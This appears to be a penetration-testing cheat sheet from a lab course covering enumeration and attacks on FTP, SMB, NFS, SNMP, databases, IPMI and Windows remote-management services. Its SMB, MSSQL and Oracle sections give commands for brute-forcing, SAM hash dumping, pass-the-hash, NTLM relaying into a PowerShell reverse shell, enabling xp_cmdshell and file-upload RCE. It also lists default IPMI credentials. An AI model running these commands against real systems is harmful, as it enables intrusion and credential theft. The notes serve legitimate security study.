# Content 
- [FTP](#ftp)
- [SMB](#smb)
- [NFS](#nfs)
- [DNS](#dns)
- [SMTP](#smtp)
- [IMAP / POP3](#imap--pop3)
- [SNMP](#snmp)
- [MySQL](#mysql)
- [MSSQL](#mssql)
- [Oracle TNS](#oracle-tns)
- [IPMI](#ipmi)
- Linux Remote Management Protocols
  - [SSH](#ssh)
  - [Rsync](#rsync)
  - [R-Services](#r-services)
- Windows Remote Management Protocols
  - [RDP](#rdp)
  - [WinRM](#winrm)
  - [WMI](#wmi)




| SMB           | FTP        | Email       | Databases                |
|---------------|------------|-------------|--------------------------|
| smbclient     | ftp        | Thunderbird | mssql-cli                |
| CrackMapExec  | lftp       | Claws       | mycli                    |
| SMBMap        | ncftp      | Geary       | mssqlclient.py           |
| Impacket      | filezilla  | MailSpring  | dbeaver                  |
| psexec.py     | crossftp   | mutt        | MySQL Workbench          |
| smbexec.py    |            | mailutils   | SQL Server Management Studio or SSMS    |
|               |            | sendEmail   |                          |
|               |            | swaks       |                          |
|               |            | sendmail    |                          |
|               |            |             |                          |





## FTP
File Transfer Protocol
### port used  
- 21/TCP for control channel
- 20/TCP for data channel in active mode
- for passice mode the server tell the client which port to connect
### Dangerous Settings
| Setting                      | Description                                              |
|------------------------------|----------------------------------------------------------|
| anonymous_enable=YES         | Allowing anonymous login?                               |
| anon_upload_enable=YES       | Allowing anonymous to upload files?                     |
| anon_mkdir_write_enable=YES | Allowing anonymous to create new directories?           |
| no_anon_password=YES         | Do not ask anonymous for password?                      |
| anon_root=/home/username/ftp| Directory for anonymous.                                 |
| write_enable=YES             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |

### Footprinting the Service
- nmap 
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136

sudo nmap -sV -p21 -sC -A 10.129.14.136 --script ftp*
```
### Service Interaction
- connect
```bash
ftp 10.129.14.136

nc -nv 10.129.14.136 21

telnet 10.129.14.136 21

openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
- commands

| Command | Description                                                                                               |
|---------|-----------------------------------------------------------------------------------------------------------|
| connect | Sets the remote host, and optionally the port, for file transfers.                                         |
| get     | Transfers a file or set of files from the remote host to the local host.                                     |
| put     | Transfers a file or set of files from the local host onto the remote host.                                   |
| quit    | Exits tftp.                                                                                                |
| status  | Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. |
| verbose | Turns verbose mode, which displays additional information during file transfer, on or off.                  |

- Download All Available Files
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```
## SMB
Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network

- `CIFS` was used as the same as SMB but now it's old and work on the same ports as SMB

### port used  
-  `OLD` 137, 138, and 139 TCP
-  `NEW` 445 TCP

### Dangerous Settings
| Setting             | Description                                                   |
|---------------------|---------------------------------------------------------------|
| browseable = yes    | Allow listing available shares in the current share?          |
| read only = no      | Forbid the creation and modification of files?                |
| writable = yes      | Allow users to create and modify files?                       |
| guest ok = yes      | Allow connecting to the service without using a password?     |
| enable privileges = yes | Honor privileges assigned to specific SID?                 |
| create mask = 0777 | What permissions must be assigned to the newly created files? |
| directory mask = 0777 | What permissions must be assigned to the newly created directories? |
| logon script = script.sh | What script needs to be executed on the user's login?     |
| magic script = script.sh | Which script should be executed when the script gets closed? |
| magic output = script.out | Where the output of the magic script needs to be stored?   |


### Footprinting the Service
- nmap
```bash
 sudo nmap 10.129.14.128 -sV -sC -p139,445
```
- smbmap
```bash
smbmap -H 10.129.202.5 -s sambashare
```
- metasploit
```bash
# bruteforce login
msf > use auxiliary/scanner/smb/smb_login
```
### RCE 

```
/usr/share/doc/python3-impacket/examples/psexec.py

/usr/share/doc/python3-impacket/examples/smbexec.py

/usr/share/doc/python3-impacket/examples/atexec.py

netexec smb 10.129.202.85 -u user.list -p password.list   -x 'whoami' --exec-method smbexec
```
### Enumerating Logged-on Users
```bash
netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

```

### Extract Hashes from SAM Database

```bash
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

/usr/share/doc/python3-impacket/examples/samrdump.py 10.129.14.128
```

### Pass-the-Hash
```
netexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Forced Authentication Attacks
#### Responder
- if we are in the same network we can pretend to be a smb server and catch the user hashes 
```
1) The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
2) If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
3) Is there no local DNS record? A query will be sent to the DNS server that has been configured.
4) If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
```
- user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\` In that case, the machine will send a multicast query to all devices on the network

```
 responder -I <interface name>
```

#### relay attack 
- will capture credintials and pass it using techniques like `PtH` to another systems 
- [revshells](https://www.revshells.com/)
```shell
#  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
cat /etc/responder/Responder.conf | grep 'SMB ='

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <poweshell base64 reverse shell>'

```


### Service Interaction
- smbclient
```
smbclient -N -L //10.129.14.128
```

- smb commands

| Command        | Description                                                  |
|----------------|--------------------------------------------------------------|
| `?`            | Displays a list of available commands or provides help.       |
| `allinfo`      | Displays detailed information about a file or directory.     |
| `cd`           | Changes the current working directory on the remote server.   |
| `get`          | Downloads a file from the remote server.                     |
| `put`          | Uploads a file to the remote server.                         |
| `ls`           | Lists the contents of the current directory on the server.   |
| `mkdir`        | Creates a new directory on the remote server.                |
| `pwd`          | Prints the current working directory on the server.          |
| `quit` (`q`)   | Exits the `smbclient` session.                               |



- rpcclient
```bash
rpcclient -U "" 10.129.14.128
```
- rpcclient commands

| Query               | Description                                                   |
|---------------------|---------------------------------------------------------------|
| srvinfo             | Server information.                                           |
| enumdomains         | Enumerate all domains that are deployed in the network.       |
| querydominfo        | Provides domain, server, and user information of deployed domains. |
| netshareenumall     | Enumerates all available shares.                              |
| netsharegetinfo \<share\> | Provides information about a specific share.               |
| enumdomusers        | Enumerates all domain users.                                  |
| queryuser \<RID\>     | Provides information about a specific user.                  |

## NFS
- Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. 
- NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers.

### port used  
- Port 2049 TCP or UDP: NFS 
- Port 111 TCP or UDP : for SUN Remote Procedure Call which is used as portmapper .and nfs rely on it for auth
### Dangerous Settings

| Option          | Description                                                                                      |
|-----------------|--------------------------------------------------------------------------------------------------|
| rw              | Read and write permissions.                                                                      |
| insecure        | Ports above 1024 will be used.                                                                   |
| nohide          | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| no_root_squash  | All files created by root are kept with the UID/GID 0.                                           |

### Footprinting the Service
- nmap
```
sudo nmap 10.129.14.128 -p111,2049 -sV -sC --script nfs*
```
### Service Interaction
```bash
$ showmount -e 10.129.14.128

$ mkdir target-NFS
$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
$ cd target-NFS
$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share




$ cd ..
$ sudo umount ./target-NFS
```
## DNS

### Dangerous Settings

| Option            | Description                                                     |
|-------------------|-----------------------------------------------------------------|
| allow-query       | Defines which hosts are allowed to send requests to the DNS server. |
| allow-recursion   | Defines which hosts are allowed to send recursive requests to the DNS server. |
| allow-transfer    | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| zone-statistics   | Collects statistical data of zones.                             |


### Service Interaction
- dig
- dnsenum
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

## SMTP

### port used
- Port 25/tcp  old but gold smtp
- Port 587/tcp modern smtp support tls
- Port 465/tcp deprcated but still widly used for smtp and support tls
- Port 2525/tcp not an official SMTP port but still popularly used 

### Dangerous Settings
- open relay
```
mynetworks = 0.0.0.0/0
```
### Footprinting the Service
- nmap 
```
sudo nmap 10.129.14.128 -sC -sV -p25 --script smtp-open-relay
```

- enum usernames
```
smtp-user-enum -M VRFY -U username   -t 10.129.247.222  -p 25 -w 60
```

### Service Interaction
- Telnet
```
telnet 10.129.14.128 25
```

- smtp commands

| Command     | Description                                            |
|-------------|--------------------------------------------------------|
| HELO        | Identifies the sender's SMTP client to the server.     |
| EHLO        | Extended HELO command providing additional capabilities.|
| MAIL FROM:  | Specifies the email address of the sender.             |
| RCPT TO:    | Specifies the email address of the recipient.          |
| DATA        | Indicates the start of the email message data.         |
| QUIT        | Terminates the SMTP session and closes the connection. |
| AUTH        | Initiates authentication process with the server.      |
| NOOP        | No-operation command, used to keep the connection alive.|
| RSET        | Resets the current session, discarding previous commands.|
| VRFY        | Verifies the existence of a specific email address.    |
| HELP        | Requests help information from the server.             |
| STARTTLS    | Initiates a secure connection using TLS encryption.    |

## IMAP / POP3

### port used
- POP3 ports 110 , 995 (TLS/SSL) both of them tcp
- IMAP ports 143 , 993 (TLS/SSL) both of them tcp

### Dangerous Settings

| Setting                  | Description                                                                    |
|--------------------------|--------------------------------------------------------------------------------|
| auth_debug               | Enables all authentication debug logging.                                      |
| auth_debug_passwords     | Adjusts log verbosity, the submitted passwords, and the scheme gets logged.    |
| auth_verbose             | Logs unsuccessful authentication attempts and their reasons.                    |
| auth_verbose_passwords   | Passwords used for authentication are logged and can also be truncated.        |
| auth_anonymous_username | Specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |



### Footprinting the Service

```
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

### Service Interaction



```
openssl s_client -connect 10.129.14.128:pop3s

openssl s_client -connect 10.129.14.128:imaps
```


- IMAP Commands (add `a` befire every command)

| Command               | Description                                                             |
|-----------------------|-------------------------------------------------------------------------|
| LOGIN username password | User's login.                                                           |
| LIST "" *             | Lists all directories.                                                  |
| CREATE "INBOX"        | Creates a mailbox with a specified name.                                |
| DELETE "INBOX"        | Deletes a mailbox.                                                      |
| RENAME "ToRead" "Important" | Renames a mailbox.                                                   |
| LSUB "" *             | Returns a subset of names from the set of names that the User has declared as being active or subscribed. |
| SELECT INBOX          | Selects a mailbox so that messages in the mailbox can be accessed.      |
| UNSELECT INBOX        | Exits the selected mailbox.                                             |
| FETCH ID all        | Retrieves data associated with a message in the mailbox.                |
| FETCH ID BODY[]        | Retrieves email body               |
| CLOSE                 | Removes all messages with the Deleted flag set.                         |
| LOGOUT                | Closes the connection with the IMAP server.                             |

- POP3 Commands

| Command    | Description                                                     |
|------------|-----------------------------------------------------------------|
| USER username | Identifies the user.                                            |
| PASS password | Authentication of the user using its password.                  |
| STAT         | Requests the number of saved emails from the server.            |
| LIST         | Requests from the server the number and size of all emails.     |
| RETR id      | Requests the server to deliver the requested email by ID.       |
| DELE id      | Requests the server to delete the requested email by ID.        |
| CAPA         | Requests the server to display the server capabilities.         |
| RSET         | Requests the server to reset the transmitted information.       |
| QUIT         | Closes the connection with the POP3 server.                     |






## SNMP
- Simple Network Management Protocol (SNMP) was created to monitor network devices. 
- In addition, this protocol can also be used to handle configuration tasks and change settings remotely. 

**Components of SNMP:**
- SNMP Manager: The central management station responsible for monitoring and managing network devices. It sends SNMP requests to agents and receives responses.
- SNMP Agent: Software running on network devices that collects and maintains management information. Agents respond to SNMP requests from managers and can also send notifications (traps) to managers.
- MIB: Management Information Base is a collection of hierarchical data definitions that describe the managed objects in a device.  Each object has a unique identifier (OID) and can be read, written, or polled via SNMP.

**versions**
- SNMPv1:
  - Lacks built-in authentication and encryption.
  - Vulnerable to unauthorized access and interception of data.
  - Still used in some small networks but considered insecure for larger or sensitive environments.
- SNMPv2 (SNMPv2c):
  - use community strings for auth.
  - Community strings transmitted in plain text, lacking encryption.
- SNMPv3:
  - Introduces authentication using username and password.
  - Supports transmission encryption via pre-shared key.


### port used
- port 161/UDP to transmit control commands
- port 162/UDB send notifications sent by agents to managers

### Dangerous Settings

| Setting              | Description                                                                                  |
|----------------------|----------------------------------------------------------------------------------------------|
| rwuser noauth        | Provides access to the full OID tree without authentication.                                 |
| rwcommunity `community string` `IPv4 address` | Provides access to the full OID tree regardless of where the requests were sent from.  |
| rwcommunity6 `community string` `IPv6 address` | Same access as with rwcommunity with the difference of using IPv6.                   |

### Footprinting the Service
- SNMPwalk
```
snmpwalk -v2c -c public 10.129.14.128
```
- OneSixtyOne (brute community string)
```
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
```
- Braa (brute-force the individual OIDs)
```
 braa public@10.129.14.128:.1.3.6.*
```

## MySQL

### port used
- Port 3306/tcp default
### Dangerous Settings

| Setting          | Description                                                                                          |
|------------------|------------------------------------------------------------------------------------------------------|
| user             | Sets which user the MySQL service will run as.                                                       |
| password         | Sets the password for the MySQL user.                                                                |
| admin_address    | The IP address on which to listen for TCP/IP connections on the administrative network interface.    |
| debug            | Indicates the current debugging settings.                                                            |
| sql_warnings     | Controls whether single-row INSERT statements produce an information string if warnings occur.       |
| secure_file_priv | Used to limit the effect of data import and export operations.                                        |

### Footprinting the Service
- nmap
```
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
### Service Interaction
- mysql
```
mysql -u root -h 10.129.14.132
```

## MSSQL
### port used
- Port  1433/TCP
### Dangerous Settings
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of named pipes
- Weak & default sa credentials. Admins may forget to disable this account
### Footprinting the Service
- nmap
```bash
$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
- mssql_ping  metaspolit

### MSSQL attack
- rce 
```shell
xp_cmdshell 'whoami'

# enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE


```
- 

### Service Interaction
```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py Administrator@10.129.201.248 -windows-auth
```
## Oracle TNS
The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.

**Components**
- Listener: A process on the server side that listens for incoming connection requests from clients and establishes communication channels with the appropriate database instances.
- Service Name: A logical name associated with a specific database service or instance, used by clients to identify and connect to the desired database.
- Connect Descriptor: Contains information necessary for a client to establish a connection to an Oracle database, including network protocol, server hostname or IP address, port number, and service name.
- Listener.ora: A configuration file defining settings for the Listener process, including protocol addresses, offered services, and security settings.
- Tnsnames.ora: A configuration file used by Oracle clients to resolve service names to connect descriptors, facilitating easy identification and connection to Oracle databases.

### port used
- Port 1521/tcp

### Dangerous Settings
- Oracle 9: Default password is "CHANGE_ON_INSTALL."
- Oracle 10: No default password is set.
- Oracle DBSNMP service often uses default password "dbsnmp."
- the finger service enabled can pose security risks and make Oracle services vulnerable to unauthorized access.

### Footprinting the Service
- namp
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

- Oracle-Tools-setup.sh
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
- ODAT
```bash
./odat.py all -s 10.129.204.235
```

### Service Interaction
- SQLplus
```bash
sqlplus username/pass@10.129.204.235/XE
```
- Oracle RDBMS - File Upload (RCE)
```bash
$ echo "Oracle File Upload Test" > testing.txt
$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
$ curl -X GET http://10.129.204.235/testing.txt
```
## IPMI
- Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.
- IPMI is typically used in three ways:
  - Before the OS has booted to modify BIOS settings
  - When the host is fully powered down
  - Access to a host after a system failure

### port used
- port 623/UDP 

### Dangerous Settings

- default password

| Product             | Username       | Password                                                  |
|---------------------|----------------|-----------------------------------------------------------|
| Dell iDRAC         | root           | calvin                                                    |
| HP iLO             | Administrator  | Randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI    | ADMIN          | ADMIN                                                     |



### Footprinting the Service
- nmap
```
$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```
- auxiliary/scanner/ipmi/ipmi_version (metasploit)
- auxiliary/scanner/ipmi/ipmi_dumphashes (metasploit)


## SSH
### port used
- port 22/TCP-UDP
### Dangerous Settings

| Setting                  | Description                                       |
|--------------------------|---------------------------------------------------|
| PasswordAuthentication  | Allows password-based authentication.            |
| PermitEmptyPasswords    | Allows the use of empty passwords.               |
| PermitRootLogin         | Allows logging in as the root user.              |
| Protocol                 | Uses an outdated version of encryption.          |
| X11Forwarding           | Allows X11 forwarding for GUI applications.       |
| AllowTcpForwarding      | Allows forwarding of TCP ports.                  |
| PermitTunnel            | Allows tunneling.                                 |
| DebianBanner            | Displays a specific banner when logging in.      |

### Footprinting the Service
- nmap
```bash
 sudo nmap -sV -p22 10.129.247.222 --script ssh*
```

## Rsync
Rsync is a fast and efficient tool for locally and remotely copying files.
### port used
- 873/TCP
### Dangerous Settings
- open share
- no auth 
### Footprinting the Service
- nmap
```
sudo nmap -sV -p 873 127.0.0.1
```
### Service Interaction
```
rsync -av --list-only rsync://127.0.0.1/dev
```

## R-Services

| Command | Service Daemon | Port | Transport Protocol | Description |
|---------|----------------|------|--------------------|-------------|
| rcp     | rshd           | 514  | TCP                | Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system. |
| rsh     | rshd           | 514  | TCP                | Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation. |
| rexec   | rexecd         | 512  | TCP                | Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files. |
| rlogin  | rlogind        | 513  | TCP                | Enables a user to log in to a remote host over the network. It works similarly to telnet but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files. |

### Footprinting the Service
```
sudo nmap -sV -p 512,513,514 10.0.17.2
```


### Service Interaction
```
rlogin 10.0.17.2 -l htb-student
```


## RDP
### port used
- 3389/TCP-UDP as the transport protocol.
### Dangerous Settings
### Footprinting the Service
- nmap
```
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
```
- RDP Security Check
```bash
# install
$ sudo cpan

Loading internal logger. Log::Log4perl recommended for better logging

CPAN.pm requires configuration, but most of it can be done automatically.
If you answer 'no' below, you will enter an interactive dialog for each
configuration option instead.

Would you like to configure as much as possible automatically? [yes] yes


Autoconfiguration complete.

commit: wrote '/root/.cpan/CPAN/MyConfig.pm'

You can re-run configuration any time with 'o conf init' in the CPAN shell

cpan shell -- CPAN exploration and modules installation (v2.27)
Enter 'h' for help.


cpan[1]> install Encoding::BER

Fetching with LWP:
http://www.cpan.org/authors/01mailrc.txt.gz
```
```
$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
$ ./rdp-sec-check.pl 10.129.201.248
```



### Service Interaction
- xfreerdp
```
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```
 - rdesktop
 - Remmina

## WinRM
The Windows Remote Management (WinRM) is a simple Windows integrated remote management protocol based on the command line
### port used
- 5985/tcp
- 5986/tcp with tls
### Footprinting the Service
- nmap
```bash
 nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```
### Service Interaction
- evil-winrm
```
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

## WMI
### port used
- 135/TCP
### Service Interaction
```
nmap -sV -sC 10.129.201.248 -p 135 --script rdp*
```
### Service Interaction
- wmiexec
```
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```
